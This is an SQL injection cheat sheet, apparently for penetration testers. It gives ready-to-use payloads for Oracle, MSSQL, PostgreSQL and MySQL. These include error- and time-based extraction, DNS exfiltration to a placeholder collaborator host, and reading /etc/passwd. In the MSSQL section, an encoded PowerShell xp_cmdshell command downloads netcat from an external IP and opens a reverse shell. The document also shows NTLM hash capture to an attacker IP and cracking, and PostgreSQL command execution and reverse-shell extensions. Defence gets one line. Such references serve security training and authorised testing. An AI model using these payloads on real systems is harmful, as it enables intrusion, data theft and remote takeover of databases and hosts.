# SQL Injection Cheat Sheet

---

## General / Universal

> These work regardless of the database backend or require no DB-specific knowledge.

### Boolean-Based

```sql
' OR 1=1 --
' AND 1=1 --
' AND 1=2 --
```

### Comment Syntax (Universal)

```sql
-- comment       (standard SQL, works in Oracle, MSSQL, PostgreSQL)
/* comment */    (block comment, works in MSSQL, PostgreSQL, MySQL)
```

### Defending Against SQL Injection

Use `parameterized queries`!

### Headers That May Be Susceptible to SQLi

```
HOST: 127.0.0.1'
X-Forwarded-For: 127.0.0.1'
User-Agent: Mozilla/5.0'
Referer: http://example.com'
Cookie: session=abc123'
```

### Regex Patterns for Finding SQLi Vulnerabilities

```regex
SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP (WHERE|VALUES).*?' (WHERE|VALUES).*" + .*sql.*" jdbcTemplate
```

### Common Character Bypasses

- Use `/**/` instead of space.
- Use `$$string$$` instead of `'string'`.

---
---
---

## Oracle

### String Concatenation

```sql
'foo'||'bar'
```

### Substring

```sql
SUBSTR('foobar', 4, 2)
```

### Comments

```sql
--comment
```

### Database Version

```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
```

### Database Contents

**List tables:**

```sql
SELECT * FROM all_tables
```

**List columns:**

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional Errors

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

### Time Delays

```sql
dbms_pipe.receive_message(('a'),10)
```

### Conditional Time Delays

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```

### DNS Lookup

**Unpatched:**

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**Patched (elevated privs):**

```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

### DNS Lookup with Data Exfiltration

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

> Oracle does **not** support stacked queries.

---
---
---

## Microsoft SQL Server (MSSQL)

### String Concatenation

```sql
'foo'+'bar'
```

### Substring

```sql
SUBSTRING('foobar', 4, 2)
```

### Comments

```sql
--comment
/*comment*/
```

### Database Version

```sql
SELECT @@version
```

### Database Contents

**List tables:**

```sql
SELECT * FROM information_schema.tables   -- TABLE_NAME column
```

**List columns:**

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional Errors

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
```

### Error-Based Data Extraction

```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret')
-- Error: Conversion failed when converting the varchar value 'secret' to data type int.
```

### Stacked Queries

```sql
QUERY-1; QUERY-2
```

### Boolean-Based

```sql
' AND 1=1;--
```

### Time-Based

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10';--
```

### Time Delays

```sql
WAITFOR DELAY '0:0:10'
```

### Conditional Time Delays

```sql
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```

### DNS Lookup

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

### DNS Lookup with Data Exfiltration

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

### DNS OOB (Extended)

|SQL Function|SQL Query|
|---|---|
|`master..xp_dirtree`|`DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_fileexist`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`master..xp_subdirs`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');`|
|`sys.dm_os_file_exists`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');`|
|`fn_trace_gettable`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);`|
|`fn_get_audit_file`|`DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`|
|`split result into sub-domains`|`DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`|

### RCE (xp_cmdshell)

```sql
-- Check if we are sysadmin
IS_SRVROLEMEMBER('sysadmin');

-- Enable 'Advanced Options'
EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;

-- Enable 'xp_cmdshell'
EXEC sp_configure 'xp_cmdshell', '1';RECONFIGURE;

-- Ping ourselves
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';

--Reverse Shell create server at 4443 and listener at 4444
sudo python3 -m http.server 4443

sudo nc -lvnp 4444

--this is base64 to give you shell
EXEC xp_cmdshell 'powershell+-exec+bypass+-enc+KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA3AC4AMQA0ADIAOgA0ADQANAAzAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADEAMAAuADEANwAuADEANAAyACAANAA0ADQANAAgAC0AZQAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlADsA';


```

### NetNTLM Hash Capture

```bash
sudo python3 Responder.py -I eth0
```

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
```

```bash
hashcat -m 5600 'file containing the hash.txt' ~/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### File Read

```sql
-- Check permissions
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE')
WHERE permission_name = 'ADMINISTER BULK OPERATIONS'
OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';

-- Get file length
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x;

-- Get file contents
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x;
```

---
---
---
## PostgreSQL

### String Concatenation

```sql
'foo'||'bar'
```

### Substring

```sql
SUBSTRING('foobar', 4, 2)
```

### Comments

```sql
--comment
/*comment*/
```

### Database Version

```sql
SELECT version()
```

### Database Contents

**List tables:**

```sql
SELECT * FROM information_schema.tables
```

**List columns:**

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional Errors

```sql
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
```

### Error-Based Data Extraction

```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
-- Error: invalid input syntax for integer: "secret"
```

### Error-Based SQL Injection (Extended)

```sql
' and 0=CAST((SELECT VERSION()) AS INT)--
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--
';SELECT CAST(CAST(QUERY_TO_XML('SELECT ...',TRUE,TRUE,'') AS TEXT) AS INT)--
```

### Stacked Queries

```sql
QUERY-1; QUERY-2
```

### Time Delays

```sql
|| SELECT pg_sleep(10)
```

### Conditional Time Delays

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

### DNS Lookup

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

### DNS Lookup with Data Exfiltration

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
  SELECT into p (SELECT YOUR-QUERY-HERE);
  c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
  execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

### Reading Files

**With COPY:**

```sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
SELECT * FROM tmp;
DROP TABLE tmp;
```

**With Large Objects:**

```sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(16513);
SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
```

```bash
echo 726f6f743<SNIP> | xxd -r -p
```

### Writing Files

**With COPY:**

```sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
```

**With Large Objects:**

```bash
split -b 2048 /etc/passwd xaa
xxd -ps -c 99999999999 xaa
```

```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
SELECT lo_export(31337, '/tmp/passwd');
SELECT lo_unlink(31337);
```

### Command Execution

**RCE with COPY:**

```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;
```

**RCE with Extensions:**

```bash
sudo apt install postgresql-server-dev-13 gcc
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
nc -nvlp 443
```

```sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('127.0.0.1', 443);
```

---

## MySQL

### String Concatenation

```sql
'foo' 'bar'
CONCAT('foo','bar')
```

### Substring

```sql
SUBSTRING('foobar', 4, 2)
```

### Comments

```sql
#comment
-- comment    (note the trailing space)
/*comment*/
```

### Database Version

```sql
SELECT @@version
```

### Database Contents

**List tables:**

```sql
SELECT * FROM information_schema.tables   -- name column
SELECT table_name FROM information_schema.tables
```

**List columns:**

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional Errors

```sql
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```

### Error-Based Data Extraction

```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
-- Error: XPATH syntax error: '\secret'
```

### Stacked Queries

```sql
QUERY-1; QUERY-2
-- Limited support — depends on PHP/Python API
```

### Time Delays

```sql
SELECT SLEEP(10)
```

### Conditional Time Delays

```sql
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```

### DNS Lookup (Windows Only)

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```

### DNS Lookup with Data Exfiltration (Windows Only)

```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```